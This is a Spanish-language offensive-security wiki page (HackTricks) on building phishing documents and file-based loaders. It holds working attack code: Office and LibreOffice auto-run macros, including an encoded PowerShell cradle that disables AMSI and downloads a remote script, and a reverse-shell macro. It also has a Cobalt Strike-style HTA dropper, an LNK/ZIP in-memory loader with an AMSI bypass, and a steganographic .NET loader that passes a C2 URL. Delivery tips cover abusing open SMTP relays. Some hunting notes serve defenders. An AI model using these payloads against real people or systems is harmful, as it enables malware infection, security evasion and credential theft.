# Archivos y documentos de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Documentos de Office

Microsoft Word realiza la validación de los datos del archivo antes de abrirlo. La validación de los datos se realiza mediante la identificación de la estructura de datos, según el estándar OfficeOpenXML. Si se produce algún error durante la identificación de la estructura de datos, el archivo analizado no se abrirá.

Normalmente, los archivos de Word que contienen macros utilizan la extensión `.docm`. Sin embargo, es posible cambiar el nombre del archivo modificando la extensión y conservar sus capacidades de ejecución de macros.\
Por ejemplo, un archivo RTF no admite macros por diseño, pero un archivo DOCM renombrado a RTF será gestionado por Microsoft Word y podrá ejecutar macros.\
Los mismos elementos internos y mecanismos se aplican a todo el software de la suite Microsoft Office (Excel, PowerPoint, etc.).

Puedes utilizar el siguiente comando para comprobar qué extensiones van a ser ejecutadas por algunos programas de Office:
```bash
assoc | findstr /i "word excel powerp"
```
Los archivos DOCX que hacen referencia a una plantilla remota (Archivo –Opciones –Complementos –Administrar: Plantillas –Ir) que incluye macros también pueden “ejecutar” macros.

### Carga de imagen externa

Ve a: _Insertar --> Elementos rápidos --> Campo_\
_**Categorías**: Vínculos y referencias, **Nombres de campo**: includePicture y **Nombre de archivo o URL**:_ http://<ip>/whatever

![Documentos de Office - Carga de imagen externa: Ve a: Insertar -- Elementos rápidos -- Campo](<../../images/image (155).png>)

### Backdoor de macros

Es posible utilizar macros para ejecutar código arbitrario desde el documento.

#### Funciones de carga automática

Cuanto más comunes sean, más probable será que el AV las detecte.

- AutoOpen()
- Document_Open()

#### Ejemplos de código de macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Eliminar manualmente los metadatos

Ve a **Archivo > Información > Inspeccionar documento > Inspeccionar documento**, lo que abrirá el Inspector de documentos. Haz clic en **Inspeccionar** y, a continuación, en **Quitar todo**, junto a **Propiedades del documento e información personal**.

#### Extensión del documento

Cuando termines, selecciona el menú desplegable **Guardar como tipo** y cambia el formato de **`.docx`** a Word 97-2003 **`.doc`**.\
Hazlo porque **no puedes guardar macro's dentro de un `.docx`** y existe un **estigma** **en torno a** la extensión **`.docm`** habilitada para macros (por ejemplo, el icono de miniatura tiene un enorme `!` y algunas puertas de enlace web/correo electrónico los bloquean por completo). Por lo tanto, esta **extensión `.doc` heredada es el mejor compromiso**.

#### Generadores de Malicious Macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros de ejecución automática de LibreOffice ODT (Basic)

Los documentos de LibreOffice Writer pueden incrustar macros Basic y ejecutarlas automáticamente cuando se abre el archivo vinculando la macro al evento **Open Document** (Herramientas → Personalizar → Eventos → Open Document → Macro…).<sup>[[1]](#references)</sup> Una macro de reverse shell sencilla tiene el siguiente aspecto:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Ten en cuenta las comillas dobles (`""`) dentro de la cadena: LibreOffice Basic las utiliza para escapar comillas literales, por lo que los payloads que terminan en `...==""")` mantienen equilibrados tanto el comando interno como el argumento de Shell.

Consejos de entrega:

- Guarda el archivo como `.odt` y vincula la macro al evento del documento para que se ejecute inmediatamente al abrirlo.
- Al enviar correos con `swaks`, utiliza `--attach @resume.odt` (la `@` es necesaria para que el archivo, y no la cadena con el nombre del archivo, se envíe como adjunto). Esto es fundamental al abusar de SMTP servers que aceptan destinatarios `RCPT TO` arbitrarios sin validación.

## Archivos HTA

Un HTA es un programa de Windows que **combina HTML y lenguajes de scripting (como VBScript y JScript)**. Genera la interfaz de usuario y se ejecuta como una aplicación con **"plena confianza"**, sin las restricciones del modelo de seguridad de un navegador.

Un HTA se ejecuta mediante **`mshta.exe`**, que normalmente se **instala** junto con **Internet Explorer**, por lo que **`mshta` depende de IE**. Por tanto, si se ha desinstalado, los HTA no podrán ejecutarse.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forzando la autenticación NTLM

Hay varias formas de **forzar la autenticación NTLM "de forma remota"**; por ejemplo, podrías añadir **imágenes invisibles** a correos electrónicos o HTML a los que accederá el usuario (¿incluso mediante un HTTP MitM?). O enviar a la víctima la **dirección de archivos** que **activarán** una **autenticación** simplemente al **abrir la carpeta.**

**Consulta estas ideas y más en las siguientes páginas:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

No olvides que no solo puedes robar el hash o la autenticación, sino también **realizar ataques de NTLM relay**:

- [**Ataques de NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (cadena fileless)

Las campañas altamente efectivas distribuyen un ZIP que contiene dos documentos señuelo legítimos (PDF/DOCX) y un .lnk malicioso. El truco consiste en que el loader de PowerShell real se almacena dentro de los bytes sin procesar del ZIP, después de un marcador único, y el .lnk lo extrae y lo ejecuta completamente en memoria.<sup>[[2]](#references)</sup>

Flujo típico implementado por el one-liner de PowerShell del .lnk:

1) Localizar el ZIP original en rutas comunes: Desktop, Downloads, Documents, %TEMP%, %ProgramData% y el directorio padre del directorio de trabajo actual.
2) Leer los bytes del ZIP y buscar un marcador codificado (por ejemplo, xFIQCV). Todo lo que aparezca después del marcador es el payload de PowerShell incrustado.
3) Copiar el ZIP a %ProgramData%, extraerlo allí y abrir el .docx señuelo para aparentar legitimidad.
4) Bypass de AMSI para el proceso actual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Desofuscar la siguiente etapa (por ejemplo, eliminar todos los caracteres #) y ejecutarla en memoria.

Ejemplo de esqueleto de PowerShell para extraer y ejecutar la etapa incrustada:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- La entrega suele abusar de subdominios PaaS reputados (p. ej., *.herokuapp.com) y puede filtrar los payloads (servir ZIP benignos según la IP/UA).
- La siguiente etapa descifra con frecuencia shellcode base64/XOR y lo ejecuta mediante Reflection.Emit + VirtualAlloc para minimizar los artefactos en disco.

Persistencia utilizada en la misma cadena
- COM TypeLib hijacking del control Microsoft Web Browser, de modo que IE/Explorer o cualquier aplicación que lo integre vuelva a lanzar el payload automáticamente.<sup>[[2]](#references)[[4]](#references)</sup> Consulta aquí los detalles y comandos listos para usar:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Caza/IOCs
- Archivos ZIP que contienen la cadena de marcador ASCII (p. ej., xFIQCV) añadida a los datos del archivo.
- Archivos .lnk que enumeran las carpetas principales/del usuario para localizar el ZIP y abren un documento señuelo.
- Manipulación de AMSI mediante [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Hilos empresariales de larga duración que terminan con enlaces alojados bajo dominios PaaS de confianza.

## Staging con señuelo primero en LNK → persistencia mediante scheduled task → trusted CPL side-loading

Otro patrón recurrente es un **`.lnk` que suplanta un documento** y abre inmediatamente un señuelo benigno mientras prepara la cadena real en segundo plano.<sup>[[3]](#references)</sup>

Flujo observado:
1. El acceso directo **se hace pasar por un PDF** y utiliza `conhost.exe` o un proxy similar para iniciar un downloader de PowerShell ofuscado.
2. PowerShell fragmenta tokens obvios (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), por lo que las detecciones ingenuas que buscan `iwr`, `gci`, `ren`, `cpi` o `schtasks` no detectan el comando.
3. El stager descarga primero el **documento señuelo**, lo abre para la víctima y después reconstruye los archivos maliciosos en segundo plano.
4. Los payloads pueden escribirse con **extensiones basura** y luego renombrarse eliminando los caracteres de relleno, retrasando la aparición de artefactos `.exe` / `.cpl` obvios.
5. La persistencia se establece mediante una **scheduled task basada en minutos** que inicia un binario host de confianza desde una ruta escribible por el usuario.

Indicadores mínimos para la caza basados en este patrón:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Un diseño de staging útil que conviene reconocer es:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Por qué la segunda etapa es sigilosa

En el case study de Rapid7, la tarea programada ejecutaba repetidamente **`Fondue.exe`** desde `C:\Users\Public\`. Como **`APPWIZ.cpl`** estaba en el mismo directorio y exportaba **`RunFODW`**, el binario confiable de Microsoft hacía side-loading del CPL del atacante en lugar de la copia legítima del sistema.

El CPL:
- Lee un blob **AES-256-CBC** desde `C:\Windows\Tasks\editor.dat`
- Lo descifra mediante **Windows CNG / `bcrypt.dll`**
- Asigna memoria ejecutable y copia el shellcode descifrado
- Lo ejecuta indirectamente pasando el puntero al shellcode como callback de **`EnumUILanguagesW`**

Este último paso merece buscarse por separado: el malware suele evitar un salto directo `((void(*)())buf)()` y, en su lugar, abusa de una **WinAPI legítima que acepta callbacks** para transferir la ejecución.

El payload descifrado en esta campaña era shellcode de **Donut**, que después mapeaba el PE final completamente en memoria y parcheaba **AMSI/WLDP/ETW** en el proceso actual antes de transferir la ejecución. Para consultar notas más detalladas sobre side-loading y el post-processing residente en memoria, véase:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pivotes prácticos para la búsqueda:
- `.lnk` que inicia `powershell.exe` o `conhost.exe`, seguido de un documento señuelo visible.
- Descargas de corta duración a **`C:\Users\Public\`**, seguidas de cambios de nombre inmediatos desde extensiones sin sentido.
- Tareas programadas con nombres anodinos, como `GoogleErrorReport`, que se ejecutan desde **directorios escribibles por el usuario**.
- Binarios confiables que cargan archivos **`.cpl` / `.dll`** desde el mismo directorio que no pertenece al sistema.
- Blobs de texto Base64 escritos en **`C:\Windows\Tasks\`** y leídos después por el módulo cargado mediante side-loading.

## Payloads delimitados mediante Steganography en imágenes (PowerShell stager)

Las cadenas de loaders recientes distribuyen un JavaScript/VBS ofuscado que decodifica y ejecuta un PowerShell stager en Base64. Ese stager descarga una imagen, normalmente GIF, que contiene una DLL .NET codificada en Base64 y oculta como texto plano entre marcadores únicos de inicio y fin. El script busca estos delimitadores (algunos ejemplos observados en entornos reales: «<<sudo_png>> … <<sudo_odt>>>»), extrae el texto intermedio, lo decodifica de Base64 a bytes, carga el assembly en memoria e invoca un método de entrada conocido con la URL del C2.<sup>[[5]](#references)</sup>

Flujo de trabajo
- Etapa 1: Dropper JS/VBS archivado → decodifica el Base64 incrustado → inicia el PowerShell stager con -nop -w hidden -ep bypass.
- Etapa 2: PowerShell stager → descarga la imagen, extrae el Base64 delimitado por marcadores, carga la DLL .NET en memoria e invoca su método (por ejemplo, VAI), pasando la URL del C2 y las opciones.
- Etapa 3: El loader obtiene el payload final y normalmente lo inyecta mediante process hollowing en un binario confiable, habitualmente MSBuild.exe.<sup>[[7]](#references)[[8]](#references)</sup> Consulta más información sobre process hollowing y la ejecución proxy mediante utilidades confiables aquí:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Ejemplo de PowerShell para extraer una DLL de una imagen e invocar un método .NET en memoria:

<details>
<summary>Extractor y loader de payload stego en PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notas
- Esto es ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Los marcadores varían entre campañas.
- AMSI/ETW bypass y la deobfuscation de strings se aplican habitualmente antes de cargar el assembly.
- Hunting: escanear las imágenes descargadas en busca de delimitadores conocidos; identificar PowerShell accediendo a imágenes y decodificando inmediatamente blobs Base64.

Consulta también las herramientas de stego y las técnicas de carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Una etapa inicial recurrente es un archivo `.js` o `.vbs` pequeño y heavily-obfuscated entregado dentro de un archivo comprimido. Su único propósito es decodificar un string Base64 embebido y lanzar PowerShell con `-nop -w hidden -ep bypass` para bootstrappear la siguiente etapa mediante HTTPS.<sup>[[5]](#references)</sup>

Lógica de skeleton (abstracta):
- Leer el contenido del propio archivo
- Localizar un blob Base64 entre strings basura
- Decodificarlo a PowerShell ASCII
- Ejecutarlo con `wscript.exe`/`cscript.exe`, invocando `powershell.exe`

Indicadores para Hunting
- Attachments JS/VBS archivados que generan `powershell.exe` con `-enc`/`FromBase64String` en la línea de comandos.
- `wscript.exe` lanzando `powershell.exe -nop -w hidden` desde rutas temporales del usuario.

## Archivos de Windows para robar hashes NTLM

Consulta la página sobre **lugares para robar creds NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Referencias

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
